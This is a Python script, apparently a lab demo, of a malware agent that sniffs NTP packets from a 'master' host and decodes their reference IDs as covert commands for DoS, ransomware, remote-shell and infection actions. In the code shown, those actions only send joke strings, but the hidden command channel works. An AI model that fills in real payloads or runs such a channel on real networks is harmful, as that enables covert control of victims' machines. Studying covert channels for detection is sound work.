#! /usr/bin/env python3
from kamene.all import *
#from netfilterqueue import NetfilterQueue
import os
import client


class Malware:
	def __init__(self, target=None, commands=None, commandNames=None):
		self.target = "0.0.0.0"
		self.master = "10.4.8.6"
		self.commands = {
			"\0DOS".encode("utf-8"): self._dos,
			"\0RNS".encode("utf-8"): self._ransom,
			"\0RAT".encode("utf-8"): self._remote_access,
			"\0IFT".encode("utf-8"): self._infect
		}
		self.commandNames = {
			"\0DOS".encode("utf-8"): "Execute Denial-Of-Service Attack",
			"\0RNS".encode("utf-8"): "Activate Ransomware",
			"\0RAT".encode("utf-8"): "Open Remote Shell on target",
			"\0IFT".encode("utf-8"): "Infect new target machine"
		}

	def _dos(self,ip):
		client.insecureSocket(ip, "You should frown, your system is down")

	def _ransom(self,ip):
		client.insecureSocket(ip, "I've got your data, if you pay, you'll see it late-a")

	def _remote_access(self,ip):
		client.insecureSocket(ip, "You might've missed him, but my RAT's in your system")

	def _infect(self,ip):
		client.insecureSocket(ip, "I wasn't benign, your system is mine")

	def _process_packet(self, packet):
		"""
		Whenever a new packet is sniffed,
		this callback is called.
		"""
		if self.master not in packet[IP].src:
			# this is legitimate traffic
			return
		#print(packet.summary())
		ref_id = packet[NTP].id
		print("NTP reference_id:", ref_id)
		int_list = ref_id.split(".")
		byte_string = bytes([int(i) for i in int_list])
		print("Corresponding bytes:", byte_string)
	
		if byte_string.decode("utf-8")[0] == "\0":
			if byte_string in self.commands:
				print("Action:", self.commandNames[byte_string])
				try:
					self.commands[byte_string](self.target)
				except ConnectionRefusedError as e:
					print("Web socket not running on", self.target)
			else:
				print("Not a valid command", byte_string.decode('utf-8'))
		else:
			self.target = ref_id
			print("Target is now", self.target)
		print()

	def _isNTP(self, pkt):
		return pkt.haslayer(NTP) and pkt[IP].dst == "10.4.8.65"
	
	def run(self):
		sniff(iface="eth0", prn=self._process_packet, lfilter=self._isNTP)

if __name__ == "__main__":
	mw = Malware()
	mw.run()
